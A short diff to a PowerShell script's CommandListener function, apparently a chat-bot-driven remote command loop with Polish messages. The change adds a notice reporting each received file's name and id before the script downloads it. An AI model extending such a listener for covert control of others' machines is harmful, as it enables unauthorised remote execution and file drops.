@@ -155,7 +155,12 @@ function CommandListener
 
                     if ($output.Count -lt 1) { SendMessage ("Polecenie wykonane: " + $text) }
                 }
-                if ($document) { $file_id = $document.file_id; $file_name = $document.file_name; DownloadFile $file_id $file_name }
+                if ($document) { 
+    $file_id = $document.file_id
+    $file_name = $document.file_name
+    SendMessage "Odebrano dokument:`nFileName: $file_name`nFileID: $file_id"
+    DownloadFile $file_id $file_name
+}
             }
         } catch { Start-Sleep -Seconds 5 }
     }
